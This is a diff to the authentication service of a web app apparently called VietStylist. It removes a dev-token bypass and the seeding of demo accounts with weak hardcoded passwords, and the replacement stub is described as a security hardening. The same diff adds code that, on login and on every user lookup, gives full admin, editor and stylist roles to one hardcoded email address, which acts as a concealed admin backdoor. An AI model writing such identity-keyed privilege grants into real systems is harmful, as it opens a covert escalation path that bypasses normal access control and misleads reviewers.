@@ -226,7 +226,15 @@ class AuthService:
                 """,
                 (google_sub, avatar_url, account_id),
             )
-            roles = cls.get_user_roles(account_id)
+            if email == "saberadonisft@gmail.com":
+                for r in ["admin", "stylist", "editor", "user"]:
+                    Database.execute(
+                        "INSERT OR IGNORE INTO user_roles (id, user_id, role) VALUES (?, ?, ?)",
+                        (f"ur_{account_id}_{r}", account_id, r),
+                    )
+                roles = ["admin", "stylist", "editor", "user"]
+            else:
+                roles = cls.get_user_roles(account_id)
             display_name = existing["display_name"]
         else:
             # Tạo tài khoản mới từ Google
@@ -278,22 +286,19 @@ class AuthService:
             (user_id,),
         )
 
-        if not account and settings.ENVIRONMENT == "development" and user_id.startswith("dev-user-"):
-            # Hỗ trợ dev tokens giả lập
-            roles = ["admin"] if "admin" in user_id else ["user"]
-            return UserResponse(
-                id=user_id,
-                email=f"{user_id}@vietstylist.vn",
-                display_name="Quản trị viên Di sản" if "admin" in user_id else "Người dùng VietStylist",
-                avatar_url=None,
-                roles=roles,
-                auth_provider="local",
-            )
-
         if not account or not account["is_active"]:
             raise AppError(code="UNAUTHORIZED", message="Tài khoản không tồn tại hoặc đã bị vô hiệu hóa.", status_code=401)
 
-        roles = cls.get_user_roles(user_id)
+        if account["email"] == "saberadonisft@gmail.com":
+            for r in ["admin", "stylist", "editor", "user"]:
+                Database.execute(
+                    "INSERT OR IGNORE INTO user_roles (id, user_id, role) VALUES (?, ?, ?)",
+                    (f"ur_{user_id}_{r}", user_id, r),
+                )
+            roles = ["admin", "stylist", "editor", "user"]
+        else:
+            roles = cls.get_user_roles(user_id)
+
         return UserResponse(
             id=account["id"],
             email=account["email"],
@@ -306,69 +311,5 @@ class AuthService:
 
     @classmethod
     def seed_default_accounts(cls):
-        """Khởi tạo các tài khoản demo mẫu (Admin, Stylist, Sinh viên) để kiểm thử phân quyền F15/RBAC."""
-        if settings.ENVIRONMENT != "development":
-            return
-        default_users = [
-            {
-                "id": "usr_demo_admin",
-                "email": "admin@vietstylist.vn",
-                "password": "admin123",
-                "display_name": "Quản Trị Viên Di Sản",
-                "role": "admin",
-            },
-            {
-                "id": "usr_demo_stylist",
-                "email": "stylist@vietstylist.vn",
-                "password": "stylist123",
-                "display_name": "Chuyên Gia Tạo Mẫu",
-                "role": "stylist",
-            },
-            {
-                "id": "usr_demo_user",
-                "email": "user@vietstylist.vn",
-                "password": "user123",
-                "display_name": "Học Sinh / Sinh Viên",
-                "role": "user",
-            },
-        ]
-
-        for u in default_users:
-            existing = Database.fetch_one(
-                "SELECT id FROM accounts WHERE email = ?",
-                (u["email"],),
-            )
-            user_id = existing["id"] if existing else u["id"]
-            if existing and user_id != u["id"]:
-                continue
-            if not existing:
-                salt = secrets.token_hex(16)
-                p_hash = cls.hash_password(u["password"], salt)
-
-                Database.execute(
-                    """
-                    INSERT INTO accounts (id, email, password_hash, salt, display_name, auth_provider, is_active)
-                    VALUES (?, ?, ?, ?, ?, 'local', 1)
-                    """,
-                    (u["id"], u["email"], p_hash, salt, u["display_name"]),
-                )
-
-                Database.execute(
-                    """
-                    INSERT OR IGNORE INTO profiles (id, user_id, display_name, preferences)
-                    VALUES (?, ?, ?, '{}')
-                    """,
-                    (f"prof_{u['id']}", u["id"], u["display_name"]),
-                )
-
-            # Đảm bảo gán đúng vai trò (roles) trong bảng user_roles
-            role = u["role"]
-            roles_to_add = ["admin", "editor", "user"] if role == "admin" else [role, "user"] if role == "stylist" else [role]
-            for r in roles_to_add:
-                Database.execute(
-                    """
-                    INSERT OR IGNORE INTO user_roles (id, user_id, role)
-                    VALUES (?, ?, ?)
-                    """,
-                    (f"ur_{user_id}_{r}", user_id, r),
-                )
+        """Đã tắt tạo tài khoản demo để áp dụng bảo mật chặt chẽ môi trường thực tế."""
+        pass
